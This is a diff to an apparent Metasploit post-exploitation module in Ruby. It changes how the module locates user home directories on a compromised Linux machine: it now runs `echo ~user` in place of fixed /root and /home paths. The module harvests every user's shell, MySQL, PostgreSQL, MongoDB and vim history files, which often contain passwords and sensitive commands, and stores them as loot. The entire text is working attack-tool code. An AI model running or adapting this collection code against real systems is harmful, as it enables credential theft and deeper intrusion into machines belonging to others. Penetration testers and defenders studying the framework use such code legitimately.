@@ -44,13 +44,14 @@ class Metasploit3 < Msf::Post
     vprint_status("Retrieving history for #{users.length} users")
     shells = %w{ ash bash csh ksh sh tcsh zsh }
     users.each do |u|
+      home = get_home_dir(u)
       shells.each do |shell|
-        get_shell_history(u, shell)
+        get_shell_history(u, home, shell)
       end
-      get_mysql_history(u)
-      get_psql_history(u)
-      get_mongodb_history(u)
-      get_vim_history(u)
+      get_mysql_history(u, home)
+      get_psql_history(u, home)
+      get_mongodb_history(u, home)
+      get_vim_history(u, home)
     end
 
     last = execute('/usr/bin/last && /usr/bin/lastlog')
@@ -88,54 +89,47 @@ class Metasploit3 < Msf::Post
     output
   end
 
-  def get_shell_history(user, shell)
+  def get_home_dir(user)
+    home = execute("echo ~#{user}")
+    if home.empty?
+      if user == 'root'
+        return '/root'
+      else
+        return "/home/#{user}"
+      end
+    end
+    home
+  end
+
+  def get_shell_history(user, home, shell)
     return if shell.nil?
     vprint_status("Extracting #{shell} history for #{user}")
-    if user == 'root'
-      hist = cat_file("/root/.#{shell}_history")
-    else
-      hist = cat_file("/home/#{user}/.#{shell}_history")
-    end
+    hist = cat_file("#{home}/.#{shell}_history")
     save("#{shell} History for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
   end
 
-  def get_mysql_history(user)
+  def get_mysql_history(user, home)
     vprint_status("Extracting MySQL history for #{user}")
-    if user == 'root'
-      sql_hist = cat_file('/root/.mysql_history')
-    else
-      sql_hist = cat_file("/home/#{user}/.mysql_history")
-    end
+    sql_hist = cat_file("#{home}/.mysql_history")
     save("MySQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
-  def get_psql_history(user)
+  def get_psql_history(user, home)
     vprint_status("Extracting PostgreSQL history for #{user}")
-    if user == 'root'
-      sql_hist = cat_file('/root/.psql_history')
-    else
-      sql_hist = cat_file("/home/#{user}/.psql_history")
-    end
+    sql_hist = cat_file("#{home}/.psql_history")
     save("PostgreSQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
-  def get_mongodb_history(user)
+  def get_mongodb_history(user, home)
     vprint_status("Extracting MongoDB history for #{user}")
-    if user == 'root'
-      sql_hist = cat_file('/root/.dbshell')
-    else
-      sql_hist = cat_file("/home/#{user}/.dbshell")
-    end
+    sql_hist = cat_file("#{home}/.dbshell")
     save("MongoDB History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
-  def get_vim_history(user)
+  def get_vim_history(user, home)
     vprint_status("Extracting VIM history for #{user}")
-    if user == 'root'
-      vim_hist = cat_file('/root/.viminfo')
-    else
-      vim_hist = cat_file("/home/#{user}/.viminfo")
-    end
+    vim_hist = cat_file("#{home}/.viminfo")
     save("VIM History for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
   end
 end
+
